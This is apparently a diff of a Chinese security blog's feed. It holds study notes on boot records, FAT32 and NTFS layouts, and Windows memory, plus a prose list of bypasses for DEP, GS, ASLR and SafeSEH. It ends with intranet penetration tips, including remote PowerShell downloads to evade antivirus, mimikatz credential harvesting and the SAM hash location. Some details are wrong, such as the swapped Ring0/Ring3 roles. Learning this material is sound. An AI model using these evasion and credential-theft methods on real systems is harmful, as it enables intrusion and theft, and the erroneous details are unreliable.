-<li><p>Boot record ID：占2字节，合法的话就&#x3D;0xAA55</p>
-</li>
-<li><p>扩展分区：正常情况下按照DPT项数只有4个分区，为了更多分区扩展，在每个逻辑盘前都有上述结构，其中的第一项存放当前逻辑盘的地址，第二项存放的是下一个逻辑盘前的引导记录等，最后两项为空。</p>
-</li>
-<li><p>最多只能识别2TB、最多4个主分区或3主分区+1扩展分区；</p>
-</li>
-</ul>
-<hr>
-<p><strong>UEFI BIOS引导模式</strong>：</p>
-<p>win7支持，win8默认，使用GPT磁盘格式，没有自检过程；</p>
-<p>阶段 &#x3D; SEC（安全验证）—PEI（EFI前期初始化）—DXE（驱动执行环境）—BDS（启动设备选择）—TSL（操作系统加载前期）—RT（系统运行阶段）—AL（关机或系统恢复）</p>
-<ol>
-<li>同上进行通电，但CPU执行UEFI指令，并进行相关设备的初始化</li>
-<li>查找EFI分区（FAT32格式，不一定是第一个分区，其中包含系统引导的关键数据程序）</li>
-<li>加载<code>\Boot\EFI\bootmgfw.efi</code>（专用于引导windows的引导文件）</li>
-<li>读取BCD文件，其中包含多个系统的信息，可供用户选择</li>
-<li>后面同上</li>
-</ol>
-<p><strong>GPT分区模式</strong>：</p>
-<p>全局唯一标识分区表，是可扩展固件接口EFI标准的一部分，用于代替MBR</p>
-<p>包括&#x3D;保护MBR+GPT头+分区表+分区区域+分区表备份+GPT头备份</p>
-<ul>
-<li><p>保护MBR：存放了一份传统MBR（1扇区），防止不支持GPT的管理工具破坏硬盘。在这个MBR中只有一个标识为0xEE的分区（也没有引导程序等，只有一个DPT、结束标志和磁盘签名），来表明该硬盘使用GPT分区表</p>
-<blockquote>
-<p>0x07普通分区、0x27恢复分区、0xEE该扇区为PMBR</p>
-</blockquote>
-</li>
-<li><p>GPT头：用于记录分区表的信息，下面仅列出部分重要信息</p>
-<blockquote>
-<p>0x0C-4B-GPT头字节总数、0x18-8B-GPT头所在扇区号、0x48-8B-分区表起始扇区号、0x50-4B-分区表项数、0x54-4B-每个分区表项数字节数</p>
-</blockquote>
-</li>
-<li><p>分区表：2-33号扇区，共可容纳128个分区表项，每个表项128B</p>
-<blockquote>
-<p>0x20-8B-分区起始地址、0x28-8B-分区结束地址</p>
-</blockquote>
-</li>
-<li><p>每个分区最多1EB&#x3D;1048576TB空间、支持128个主分区、分区表大小不固定</p>
-</li>
-</ul>
-<h3 id="0x05-文件系统"><a href="#0x05-文件系统" class="headerlink" title="0x05.文件系统"></a>0x05.文件系统</h3><p>文件系统是让OS可以管理的一种文件集合。</p>
-<ul>
-<li>分类包括：扩展文件系统（Ext）、新技术文件系统（NTFS）、文件分配表（FAT）、光盘文件系统（CDFS）、高性能文件系统（HPFS）等。</li>
-<li>内容包括：文件系统数据、内容（具体文件）、元数据（文件信息）、文件名、应用程序等</li>
-</ul>
-<p>在win下常用簇作为单位，扇区sector &lt; 簇Cluster：4KB，为单位分配空间，即占用空间，其内部的未使用叫内部碎片，外部碎片是介于两个簇之间但 &lt; 4KB的未使用的空间。</p>
-<blockquote>
-<p>松弛&#x2F;文件残留空间：指的是文件最后一个数据单元中未使用的字节；<br>卷松弛：文件系统末端和其占用的分区末端之间有空</p>
-</blockquote>
-<p>分配簇&#x2F;文件空间的算法主要有：</p>
-<ul>
-<li>连续分配：文件连续存储</li>
-<li>链式分配：指针指向下一簇，必须连着读</li>
-<li>索引分配：所有位置的指针都写入一个索引块中</li>
-</ul>
-<p>Windows支持的文件系统有：FAT12、FAT16、<strong>FAT32</strong>、<strong>NTFS</strong>、WINFS等。Linux支持Ext2、Ext3、Minix、NTFS等。</p>
-<h4 id="FAT32"><a href="#FAT32" class="headerlink" title="FAT32"></a>FAT32</h4><p>FAT32即文件分配表FAT表项大小为32位，exFAT的表项大小64位；采用链式分配法管理已经分配或未分配的簇；</p>
-<p>所有版本的FAT布局相同：物理盘划分为&#x3D;引导区—文件分配表区（FAT区）—数据区（DATA区），前两者合称为系统区</p>
-<ul>
-<li><p>引导区：从头开始占用三个扇区，其中保存了物理盘每扇区的字节数、每一簇对应的扇区数以及引导记录等；其后面还有部分留白扇区（0x24以后的内容会根据版本号有区别，这里以FAT32为例子）；FAT16只占用1个扇区，而且后面没有留白</p>
-<p>在FAT32中，引导区&#x3D;分区引导区+FS信息扇区（DBR）+保留分区；下面是分区引导区的内容</p>
-<blockquote>
-<p>DBR：Dos Boot Record即分区引导扇区，用于引导操作系统引导程序的一部分，用于加载文件系统元数据</p>
-</blockquote>
-<table>
-<thead>
-<tr>
-<th>字节位置</th>
-<th>内容</th>
-<th>字节位置</th>
-<th>内容</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>0x00-0x02</td>
-<td>汇编指令跳转引导代码</td>
-<td>0x03-0x0a</td>
-<td>文件系统版本</td>
-</tr>
-<tr>
-<td>0x0b-0x0c</td>
-<td>每扇区的字节数</td>
-<td>0x0d</td>
-<td>每簇的扇区数</td>
-</tr>
-<tr>
-<td>0xe-0xf</td>
-<td>FAT表起始扇区号</td>
-<td>0x10</td>
-<td>FAT表个数（一般是2，用于备份）</td>
-</tr>
-<tr>
-<td>0x15</td>
-<td>介质描述符，0xf8表示固定磁盘，0xf0表示可移动磁盘</td>
-<td>0x18-0x19</td>
-<td>每磁道扇区数</td>
-</tr>
-<tr>
-<td>0x1a-0x1b</td>
-<td>磁头数</td>
-<td>0x24-0x27</td>
-<td>FAT表的扇区数</td>
-</tr>
-<tr>
-<td>0x30-0x31</td>
-<td>DBR大小</td>
-<td>0x32-0x33</td>
-<td>引导扇区的备份扇区号</td>
-</tr>
-<tr>
-<td>0x52-0x59</td>
-<td>FAT文件系统类型</td>
-<td>0x5a-0x1fd</td>
-<td>未使用，但可以包含OS启动代码</td>
-</tr>
-<tr>
-<td>0x1fe-0x1ff</td>
-<td>0xAA55结束标志</td>
-<td></td>
-<td></td>
-</tr>
-</tbody></table>
-</li>
-<li><p>FAT区：由两个相同的FAT表构成，用于备份，其中包含了文件占用的簇链、空闲空间等；FAT中每个簇都有一个表项，例如三号表项就对应的3号簇；表项记录如下（注意虽然是32位，但高4位保留，FAT16&#x3D;0002H-FEFFH个可用簇号）：</p>
-<ul>
-<li>未使用&#x2F;空闲的簇：0x0000</li>
-<li>损坏的簇：-9或0xffffff7</li>
-<li>文件下一个簇的地址</li>
-<li>文件最后一个簇或文件结束标志：-1或0x0fffffff</li>
-</ul>
-</li>
-<li><p>根目录区（ROOT区）：属于数据区的一部分；在FAT32中区域、大小都不固定，而在FAT12&#x2F;16中，固定在FAT区之后的32个扇区，最多可以存放512（32*16）个目录项；根目录下的任何文件或者子目录都会有一个根目录表项</p>
-</li>
-<li><p>目录区：属于数据区，一个目录项占32字节。以表的形式存在，又叫做目录表—DIR（Directory_Table）或文件目录表—FDT（File_Directory_Table）每个表项对应一个文件或者子目录相关信息（在FAT中文件和文件夹处理方式相同）</p>
-<blockquote>
-<p> 子目录项的最后一项为0；长文件名的需要用长文件名（LFN）目录项来存储；文件属性一项最高两位不用：0x01只读、0x02隐藏文件、0x04系统文件、0x08包含磁盘卷标签的表项、0x10子目录表项、0x20归档文件</p>
-</blockquote>
-<table>
-<thead>
-<tr>
-<th>位置</th>
-<th>说明</th>
-<th>位置</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>00-07</td>
-<td>文件正名</td>
-<td>08-0A</td>
-<td>扩展名</td>
-</tr>
-<tr>
-<td>0B</td>
-<td>文件属性(按二进制分)</td>
-<td>0C</td>
-<td>保留</td>
-</tr>
-<tr>
-<td>0D-0F</td>
-<td>文件创建时间，24位</td>
-<td>10-11</td>
-<td>16位创建时间，相对于1980年</td>
-</tr>
-<tr>
-<td>12-13</td>
-<td>16位最近访问时间</td>
-<td>14-15</td>
-<td>起始簇号的高16位</td>
-</tr>
-<tr>
-<td>16-17</td>
-<td>16位最新修改时间</td>
-<td>18-19</td>
-<td>16位最新修改时间，相对1980</td>
-</tr>
-<tr>
-<td>1A-1B</td>
-<td>起始簇号低16位</td>
-<td>1C-1F</td>
-<td>文件字节长度</td>
-</tr>
-</tbody></table>
-</li>
-</ul>
-<blockquote>
-<p>下面是LFN表项的具体内容，同样32字节，一个长文件名文件可能有多个该表项；文件名以Unicode格式保存，且占2字节</p>
-<table>
-<thead>
-<tr>
-<th>位置</th>
-<th>内容</th>
-<th>位置</th>
-<th>内容</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>0x0</td>
-<td>序列号</td>
-<td>0x1-0xa</td>
-<td>长文件名的5个文件名字符</td>
-</tr>
-<tr>
-<td>0xb</td>
-<td>长文件名属性，LFN&#x3D;0x0F</td>
-<td>0xc</td>
-<td>保留</td>
-</tr>
-<tr>
-<td>0xd</td>
-<td>校验和，根据短文件名算出</td>
-<td>0xe-0x19</td>
-<td>长文件名的6个文件名字符</td>
-</tr>
-<tr>
-<td>0x1a-0x1b</td>
-<td>保留</td>
-<td>0x1c-0x1f</td>
-<td>长文件名的2个文件名字符</td>
-</tr>
-</tbody></table>
-<p>其中序列号从1起，若是最后则与’0x40’进行或运算并填入，若对应文件&#x2F;目录被删记为’0xE5’</p>
-</blockquote>
-<h4 id="NTFS"><a href="#NTFS" class="headerlink" title="NTFS"></a>NTFS</h4><p>win_xp之后首选文件系统，使用B+树来组织目录项，解决了FAT的磁盘大小限制、空间利用率以及文件名长度等问题。NTFS具体内容太过麻烦，这里仅作部分说明</p>
-<blockquote>
-<p>同样用簇为单位，但是稍有区别，在NTFS中有逻辑簇号LCN与虚拟簇号VCN之分，前者是实际上占的簇号，后者是本文件的第几个簇号</p>
-</blockquote>
-<p>NTFS使用NTFS Log记录详细的事务日志，跟踪卷的文件系统的元数据变化（人话：有相关文件记录元数据）。</p>
-<p>格式：1个引导扇区+15个扇区的NTLDR区域+MFT分配空间+文件存储区+MFT前几个数据文件的备份+文件存储区</p>
-<ul>
-<li><p>引导扇区：包含引导程序和BPB参数（用于定位后面的NTLDR区），格式与FAT的分区引导区相似</p>
-<table>
-<thead>
-<tr>
-<th>字节偏移</th>
-<th>内容</th>
-<th>字节偏移</th>
-<th>内容</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>0x00</td>
-<td>JMP指令</td>
-<td>0x03</td>
-<td>OEM标识‘NTFS’</td>
-</tr>
-<tr>
-<td>0x0B</td>
-<td>每扇区字节数</td>
-<td>0x0D</td>
-<td>每簇扇区数</td>
-</tr>
-<tr>
-<td>0x0E</td>
-<td>保留扇区数</td>
-<td>0x10</td>
-<td>0</td>
-</tr>
-<tr>
-<td>0x15</td>
-<td>介质描述符</td>
-<td>0x16</td>
-<td>0</td>
-</tr>
-<tr>
-<td>0x18</td>
-<td>每磁道扇区数</td>
-<td>0x1A</td>
-<td>磁头数</td>
-</tr>
-<tr>
-<td>0x1C</td>
-<td>隐藏扇区数</td>
-<td>0x20</td>
-<td>0</td>
-</tr>
-<tr>
-<td>0x28</td>
-<td>总扇区数</td>
-<td>0x30</td>
-<td><code>$MFT</code>簇号</td>
-</tr>
-<tr>
-<td>0x38</td>
-<td><code>$MFTMirr</code>簇号</td>
-<td>0x40</td>
-<td>文件记录段字节数</td>
-</tr>
-<tr>
-<td>0x41</td>
-<td>0</td>
-<td>0x44</td>
-<td>索引缓冲簇数</td>
-</tr>
-<tr>
-<td>0x45</td>
-<td>0</td>
-<td>0x48</td>
-<td>卷序列数</td>
-</tr>
-<tr>
-<td>0x50</td>
-<td>校验和</td>
-<td>0x54</td>
-<td>启动指令码</td>
-</tr>
-<tr>
-<td>0x01FE</td>
-<td>0xAA55结束标志</td>
-<td></td>
-<td></td>
-</tr>
-</tbody></table>
-</li>
-<li><p>NTLDR区：引导程序的一部分（与NTFS没有必要联系，以前多用该程序来启动加载windows）</p>
-</li>
-<li><p><strong>主控文件表MFT</strong>：包含卷中所有的信息，以数组实现，每个文件记录项大小1KB，一个文件至少一项。</p>
-<p>在这个表中的前16项位置固定，且有备份，后面才存放每个文件或目录对应的MFT项；以<code>$</code>符开头，0-11如下，12-15保留。</p>
-<table>
-<thead>
-<tr>
-<th>文件名</th>
-<th>描述</th>
-<th>文件名</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>$MFT</code></td>
-<td>主文件表</td>
-<td><code>$MFTMirr</code></td>
-<td>主文件表前几项的备份</td>
-</tr>
-<tr>
-<td><code>$LogFile</code></td>
-<td>日志文件，记录元数据变化</td>
-<td><code>$Volumn</code></td>
-<td>卷文件</td>
-</tr>
-<tr>
-<td><code>$AttrDef</code></td>
-<td>属性定义列表</td>
-<td><code>$Root</code></td>
-<td>根目录文件</td>
-</tr>
-<tr>
-<td><code>$Bitmap</code></td>
-<td>位图文件，每位对应1簇，1有0未</td>
-<td><code>$Boot</code></td>
-<td>引导文件，包含DBR扇区</td>
-</tr>
-<tr>
-<td><code>$BadClus</code></td>
-<td>坏簇记录文件</td>
-<td><code>$Secure</code></td>
-<td>文件安全属性与访问控制</td>
-</tr>
-<tr>
-<td><code>$UpCase</code></td>
-<td>大小写字符转换表文件</td>
-<td><code>$Extend</code></td>
-<td>扩展属性</td>
-</tr>
-</tbody></table>
-<p>对于每一个表项，大多以’FILE‘（4B）开头，以0xFF FF FF FF结束；表项&#x3D;MFT头+属性</p>
-<p>每一个文件&#x2F;MFT表项有对应的64位文件引用地址&#x3D;16位序列号（见下表，放高位）+ 48位文件地址（也可以说是表项序号，从0递增，放低位），对于较大文件的属性除了MFT外，还有一个扩展区域来存放多余的内容。</p>
-<table>
-<thead>
-<tr>
-<th>字节偏移</th>
-<th>内容</th>
-<th>字节偏移</th>
-<th>内容</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>0-3</td>
-<td>MFT标志(好的‘FILE’，坏的‘BAAD’)</td>
-<td>4-5</td>
-<td>更新序列号</td>
-</tr>
-<tr>
-<td>6-7</td>
-<td>更新序列号的大小与数组</td>
-<td>8-15</td>
-<td>日志文件序列号</td>
-</tr>
-<tr>
-<td>16-17</td>
-<td>序列号</td>
-<td>18-19</td>
-<td>硬连接数</td>
-</tr>
-<tr>
-<td>20-21</td>
-<td>第一个属性的偏移地址</td>
-<td>22-23</td>
-<td>标志00表删除-01正在使用-02目录被删-03目录正在使用</td>
-</tr>
-<tr>
-<td>24-27</td>
-<td>文件记录的实际长度</td>
-<td>28-31</td>
-<td>文件记录的分配长度</td>
-</tr>
-<tr>
-<td>32-39</td>
-<td>基本文件记录中的文件索引号</td>
-<td>40-41</td>
-<td>下一个属性ID</td>
-</tr>
-<tr>
-<td>42-43</td>
-<td>边界</td>
-<td>44-47</td>
-<td>文件记录参考号</td>
-</tr>
-<tr>
-<td>48-1023</td>
-<td>属性和固定值</td>
-<td></td>
-<td></td>
-</tr>
-</tbody></table>
-<p>属性分为两部分，属性头+属性体（属性内容）。属性头描述了是常驻属性（属性内容存在MFT中）还是非常驻属性（存在文件区），其属性体数据结构不同。非常驻属性的内容叫做数据流，流的大小不一，其第一个字节的低4位表示流大小的字节数，高4位表示包含流的起始簇地址的字节数。属性头格式如下：</p>
-<table>
-<thead>
-<tr>
-<th>字节偏移</th>
-<th>内容</th>
-<th>字节偏移</th>
-<th>内容</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>0-3</td>
-<td>属性类型</td>
-<td>4-7</td>
-<td>属性长度</td>
-</tr>
-<tr>
-<td>8</td>
-<td>0常驻，1非常驻</td>
-<td>9</td>
-<td>属性名长度</td>
-</tr>
-<tr>
-<td>10-11</td>
-<td>属性名的开始偏移</td>
-<td>12-13</td>
-<td>标志</td>
-</tr>
-<tr>
-<td>14-15</td>
-<td>属性ID</td>
-<td></td>
-<td></td>
-</tr>
-</tbody></table>
-<p>对于常驻属性：16-19为属性体大小，20-21为属性体的偏移。非常驻属性这里不再过多叙述</p>
-</li>
-</ul>
-<h3 id="0x06-Windows内存结构与管理"><a href="#0x06-Windows内存结构与管理" class="headerlink" title="0x06. Windows内存结构与管理"></a>0x06. Windows内存结构与管理</h3><p><strong>DOS内存布局</strong>：运行于实模式中，寻址范围只有1MB。</p>
-<table>
-<thead>
-<tr>
-<th>地址</th>
-<th>内容</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>F0000-FFFFF</td>
-<td>ROM BIOS</td>
-</tr>
-<tr>
-<td>A0000-F0000</td>
-<td>设备保留区</td>
-</tr>
-<tr>
-<td>400-4F0、4F0-500、500-700</td>
-<td>BIOS、用户、DOS通信区</td>
-</tr>
-<tr>
-<td>0-400</td>
-<td>中断向量表</td>
-</tr>
-</tbody></table>
-<p><strong>Windows内存布局</strong>：</p>
-<p>开机后一般运行于保护模式下，这就使得每个32位进程都拥有4GB的虚拟内存寻址空间，且会根据OS版本对虚拟内存空间进行划分，下面是x86下32win的虚拟内存大致分布情况</p>
-<ul>
-<li><p>FFFFFFFF-80000000&#x3D;2GB（内核模式分区）：操作系统使用，不可读写；其中的数据所有进程共享，但被保护</p>
-<blockquote>
-<p>Ring0（用户模式）-Ring3（内核模式）；Ring0仅限于用户模式区，后者可访问所有内存、硬件、使用所有处理器指令，但是对其代码空间不提供保护</p>
-</blockquote>
-</li>
-<li><p>7FFFFFFF-7FFF0000&#x3D;64KB（禁入分区）：防止跨系统或跨用户边界的传输数据，不可读写</p>
-</li>
-<li><p>7FFEFFFF-00010000（用户模式区）：进程私有空间</p>
-</li>
-<li><p>0-0000FFFF&#x3D;64KB（空指针赋值区）：用户捕捉NULL指针，不可读写；用来帮助程序员捕获对空指针的赋值</p>
-</li>
-</ul>
-<p><strong>虚拟地址转译</strong>：默认情况下x86上的windows使用二级页表，来将虚拟地址转换为物理地址，页表大小默认4KB；</p>
-<p>32位虚拟地址&#x3D;页目录索引+页表索引+字节索引（12bit）</p>
-<blockquote>
-<p>CR3寄存器页目录——页目录索引找到具体页目录项(PDE)——页表——根据页表索引找到页表项(PTE)——得到具体物理地址</p>
-</blockquote>
-<p><strong>内存分配与管理函数</strong>：内存API大致分三类有以下三类</p>
-<ul>
-<li><p>虚拟内存管理：适用于占用内存较大，但不一定立即用到的程序；能够提前分配一小部分内存，需要时就会从保留的内存块中再利用</p>
-<ol>
-<li>分配&#x2F;保留虚拟内存；参数：内存地址—大小—类型—保护标志</li>
-</ol>
-<pre><code class="c++">VirtualAlloc(IpMem,Size,Type,Access)
-//Ipmem可NULL,Size单位字节
-//Type类型MEM_COMMINT提交内存、MEM_RESERVE保留内存、MEM_TOP_DOWN尽可能在高地址分配内存
-//Access,PAGE_READONLY内存可读、PAGE_READWRITE可读可写
-</code></pre>
-<ol start="2">
-<li>释放虚拟内存；参数：地址—大小—类型</li>
-</ol>
-<pre><code class="c++">VirtualFREE(IpMem,Size,Type)
-//Type为释放的类型,MEM_DECOMMIT取消内存提交、MEM_RELEASE释放
-</code></pre>
-<ol start="3">
-<li>改变页保护属性；参数：地址—大小—类型—旧属性地址</li>
-</ol>
-<pre><code class="c++">VirtualProtect(IpMem,Size,Access,IpOldAccess)
-//前三者同上，最后是一个地址用来存放旧的保护属性
-</code></pre>
-<ol start="4">
-<li>内存锁定与解锁；</li>
-</ol>
-<pre><code class="c++">VirtualLock(IpMem,Size)		//确保进程运行时，指定内存总在内存中
-VirtualUnlock(IpMem,Size)	//
-</code></pre>
-</li>
-<li><p>堆管理：适用于经常需要分配小块内存的程序</p>
-<blockquote>
-<p>缺省堆：默认1MB，进程在编译时个已更改该值，在程序运行时如果需要使用临时内存则会从其中分配内存。Win32确保在任意时刻都只能有一个线程可以在缺省堆上分配释放内存</p>
-</blockquote>
-<ol>
-<li>创建新堆</li>
-</ol>
-<pre><code class="c++">HeapCreate(flOption,dWINitalSize,cbMaximumSize)
-//flOption可选：0、HEAP_NO_SERIALIZE、HEAP_GENERATE_EXCEPTIONS
-//后两者指出堆的初始化大小和最大容量，单位Byte，会自动对齐为页大小的整数倍
-</code></pre>
-<ol start="2">
-<li>分配堆内存&#x2F;重新分配堆内存</li>
-</ol>
-<pre><code class="c++">HeapAlloc(hHeap,dwFlags,dwBytes)
-//堆句柄，可由HeapCreate、GetProcessHeap取得
-//可选HEAP_ZERO_MEMORY(内存清0)、HEAP_GENERATE_EXCEPTIONS、HEAP_NO_SERIALIZE
-//要分配的堆内存大小
-HeapReAlloc(hHEAP,dwFlags,lpMem,dwBytes)
-//第三个参数指明内存堆地址
-</code></pre>
-<ol start="3">
-<li>释放堆内存</li>
-</ol>
-<pre><code class="c++">HeapFree(hHeap,dwFlags,lpMem)
-</code></pre>
-</li>
-<li><p>内存映射文件管理：简单说就是无需打开文件等操作，可以通过映射快速操纵文件内容</p>
-<p>相关API<code>CreateFileMapping()</code>、<code>MapViewOfFile()</code>、<code>UnmapViewOfFile()</code>、<code>FlushViewOfFile()</code></p>
-</li>
-</ul>
-<h3 id="0x07-Windows安全机制"><a href="#0x07-Windows安全机制" class="headerlink" title="0x07.Windows安全机制"></a>0x07.Windows安全机制</h3><p>相关位置在windows Defender中应用和浏览器控制下的攻击防护设置</p>
-<h4 id="数据执行保护DEP"><a href="#数据执行保护DEP" class="headerlink" title="数据执行保护DEP"></a>数据执行保护DEP</h4><p>通过使可写内存的不能执行，或者来让可执行内存不可写来消除威胁。常用于防范缓冲区溢出，其他叫法：NX&#x2F;XD&#x2F;WX；</p>
-<p>具体见<span class="exturl" data-url="aHR0cHM6Ly9sZWFybi5taWNyb3NvZnQuY29tL3poLWNuL3dpbmRvd3Mvd2luMzIvbWVtb3J5L2RhdGEtZXhlY3V0aW9uLXByZXZlbnRpb24=">数据执行保护 - Win32 apps | Microsoft Learn<i class="fa fa-external-link-alt"></i></span>；</p>
-<p>在Win中DEP相关设置如下：</p>
-<ul>
-<li>OptOut：除了手动添加到排除列表中的进程外，均开起了DEP保护；多用在Server中</li>
-<li>OptIn：仅应用于核心的系统可执行文件；多用于普通win</li>
-<li>AlwaysOn：对所有进程启用DEP保护，没有例外，不可关闭</li>
-<li>AlwaysOff：所有禁用，也不能被动态开启</li>
-</ul>
-<p>具体实现有两种模式：硬件实现和软件实现</p>
-<ul>
-<li>如果CPU支持内存页NX属性，则支持硬件实现，可通过Windows DEP tabsheet查看（桌面环境下高级系统设置-高级性能设置-数据执行保护）</li>
-<li>软件支持的DEP不能直接阻止在数据页上执行代码</li>
-</ul>
-<p><strong>对抗措施</strong>：通过执行已经加载的模块中的指令，或者是调用系统函数不受DEP的影响，但是使用的栈上的参数则是攻击者构造的。</p>
-<ul>
-<li><p>利用ret-to-libc执行命令或进行API调用，如WinExec等</p>
-<blockquote>
-<p>在库中找到一段执行系统命令的代码或函数，用这段代码的地址覆盖返回地址；参考<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vemhhbmcyOTMvcC85MDI2NTg3Lmh0bWw=">内存保护机制及绕过方法——利用Ret2Libc绕过DEP之ZwSetInformationProcess函数 - zhang293 - 博客园 (cnblogs.com)<i class="fa fa-external-link-alt"></i></span></p>
-</blockquote>
-</li>
-<li><p>将包含ShellCode的内存页面标记为可执行，在跳过去执行</p>
-</li>
-<li><p>分配可执行内存，再将ShellCode复制到其中，再跳进去执行</p>
-<blockquote>
-<p>需要使用ROP技术（能够连续调用已存在的程序代码，来创建一连串指令码序列）调用API函数WriteProcessMemory、HeapCreate、VirtualAlloc、memcopy实现</p>
-</blockquote>
-</li>
-<li><p>尝试关闭DEP再运行ShellCode</p>
-<blockquote>
-<p>一个进程的DEP开启标志保存在内核结构中（_KPROCESS），当DEP置用时ExecuteDisable被置位，禁用时ExecuteEnable被置位，当Permanent置位时表明这些设置不可更改。需要借助NtQueryInformationProcess()和NtSetInformationProcess()函数来设置ProcessExecuteFlags类。</p>
-</blockquote>
-</li>
-</ul>
-<h4 id="栈溢出检查GS"><a href="#栈溢出检查GS" class="headerlink" title="栈溢出检查GS"></a>栈溢出检查GS</h4><p>在VS中默认设置该选项</p>
-<p>原理：当程序启动时，会首先计算出该程序的cookie值（动态、4B），然后将其保存在加载模块的.data节中，如果函数被调用，那么该值就会被复制到栈中（retAd、EBP之后，局部变量之前），用于在函数结束时进行检查。此外他对栈中变量进行重新排序：对函数栈帧进行重排，将字符串缓冲区分配在栈帧的最高地址上、将函数参数复制到寄存器或栈缓冲区上，防止参数被溢出</p>
-<p>条件：当函数有字符串缓冲区（且&gt;&#x3D;5字节时）或使用_alloca函数在栈上分配空间时，编译器才在栈中保存该cookie值。</p>
-<p><strong>缺陷</strong>：</p>
-<ul>
-<li>一个函数中含有多个缓冲区时，都放在同一个栈里面，可以从一个缓冲区溢出到另一个缓冲区</li>
-<li>对于参数数量不确定的函数来说，预先不知道函数参数的个数，因此无法进行保护</li>
-<li>alloca()函数动态分配的缓冲区不可避免地放在栈顶</li>
-<li>结构成员当中如果有缓冲区时，这个缓冲区将位于struct或class声明的固定位置</li>
-</ul>
-<p><strong>绕过</strong>：</p>
-<ul>
-<li>利用异常处理器绕过cookie检查</li>
-<li>替换栈和.data节中的cookie来绕过</li>
-<li>覆盖父函数的栈数据来绕过GS检查</li>
-</ul>
-<h4 id="地址空间随机分配ASLR"><a href="#地址空间随机分配ASLR" class="headerlink" title="地址空间随机分配ASLR"></a>地址空间随机分配ASLR</h4><p>进行随机化的对象有：映像（可执行文件和DLL的加载地址）、栈（每个线程起始栈的地址）、堆（改变已分配堆的基地址）</p>
-<p>实现方式：VS编辑器—DYNAMICBASE、映像加载基址随机化</p>
-<p><strong>缺陷及绕过</strong>：一个被多个进程同时使用的DLL，由于一直有人使用，因此其地址是固定的</p>
-<ul>
-<li>返回地址部分覆盖：随机化一般发生在地址的高16位，找到对应高地址空间下可以利用的跳转指令进行覆盖</li>
-<li>大多程序在编译时没有使用随机化，因此这些程序中没有启用ASLR的模块的相关跳转指令便可以作为跳板，用来引导至恶意代码</li>
-</ul>
-<h4 id="SafeSEH"><a href="#SafeSEH" class="headerlink" title="SafeSEH"></a>SafeSEH</h4><p>SafeSHE用来检测和保护和防止堆栈中的SEH函数指针被覆盖的技术</p>
-<p>原理：编译器在链接生成二进制映像文件时，会将所有合法的异常处理函数的地址解析出来制作成一张安全的SEH表，并保存在程序映像文件中的数据块里，每当这些函数被调用时，就会与SEH表中的地址进行匹配（如果映像文件不支持，则该表的地址为0）</p>
-<p>加载过程：程序影响加载到内存时，系统定位该表，并使用Shareuser内存中的一个随机数进行加密，将加密后的表地址、映像文件开始地址、长度、合法SEH函数数目作为一条记录放入到ntdll加载模块数据内存中</p>
-<p>异常处理过程：首先检查该异常处理程序是否在栈中，不在的话则不执行；并再次被检查是否位于映像文件的地址空间；在的话，则执行，否则：</p>
-<p>如果该地址位于不可执行页上，则检查DEP开启状态（开了就报错，否则执行）；若位于可执行页上，则判断系统是否允许跳转到加载模块的内存空间外执行，可以则执行否则抛错</p>
-<p><strong>绕过</strong>：必须要使用.Net编译器且开启SafeSEH连接选项</p>
-<ul>
-<li>利用未启用SafeSEH的模块作为跳板</li>
-<li>利用加载模块之外的地址进行绕过（比如堆区一般会直接跳转执行）</li>
-</ul>
-]]></content>
-      <categories>
-        <category>系统安全</category>
-      </categories>
-      <tags>
-        <tag>Windows</tag>
-        <tag>OS</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>内网渗透</title>
-    <url>/2023/08/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AE%80%E4%BB%8B/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>本文依靠实际渗透测试，仅提供参考，必定会有讲解不清楚的内容，如果有任何错误，欢迎批评指正。</p>
-<span id="more"></span>
-
-<h3 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h3><ol>
-<li>服务器支持的脚本语言</li>
-<li>服务器端口探测</li>
-<li>路径信息</li>
-</ol>
-<h4 id="Windows内网信息搜集："><a href="#Windows内网信息搜集：" class="headerlink" title="Windows内网信息搜集："></a>Windows内网信息搜集：</h4><p>目标搜集内容：IP、网关、DNS、DMZ（隔离区、位于外网与内网连接处）、工作组、域</p>
-<blockquote>
-<p>工作组中各个用户可以相互访问，组间也可以相互访问，只是名义上的普通分组。在win中专属的域机制，域之间不可直接访问，实行中心化管理机制“DC”即域控，每一个想要进入该域的机器通过Kerberos协议先访问DC，DC中存储域内用户相关信息“AD”即活动目录，经过SAM来进行NTLM验证对比，有账号管理、软件环境集中管理等。一个域中至少两个DC+AD，域间DNS查询位置</p>
-</blockquote>
-<p>cmd中<code>systeminfo</code>查看机器有关信息；密码存储位置：注册表&#x2F;文件；<code>$I</code>开头的表示文件保存路径，<code>$R</code>开头表示内容；<code>netsh</code>后<code>wlan show profile</code>查看连接过的wifi配置；杀软一般不对内存进行查杀，使用ps脚本（downloadstring）远程下载或webdelivery绕过查杀，；minikatz获取cookie；</p>
-<p>在win server中使用&#96;&#96;net&#96;命令查看域；端口识别389（LDMP、ILS、目录访问）53（DNS）；</p>
-<p>协议-工具：netbios-nbtscan；UDP-unicornscan；ICMP（ping命令，ip层）；ARP-arpscan；</p>
-<p>win下的密码凭证获取：密码格式&#x3D;名称:ID:LM-hash:NTLM-hash:::（在win03server后LM部分不用）；认证过程（本地、网络、域）</p>
-<p>本地：pwd与\system32\config\sam中对比，打开时会显示被另一个程序使用PID&#x3D;4的system，早期版本一直会被lasaa.exe进程使用（win11目前还有），如果一直在内存中，可能拿到明文密码；</p>
